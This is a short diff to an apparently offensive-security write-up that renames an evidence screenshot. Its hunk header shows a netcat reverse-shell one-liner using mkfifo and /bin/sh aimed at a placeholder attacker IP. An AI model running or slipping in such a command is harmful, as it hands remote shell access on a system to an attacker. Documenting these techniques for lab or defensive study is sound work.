@@ -127,7 +127,7 @@ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 8443 >
 ```
 
 ### 📸 Evidence
-![Script Injection](tar-exploit.png)
+![Script Injection](sudo-exploit.png)
 
 ---
 
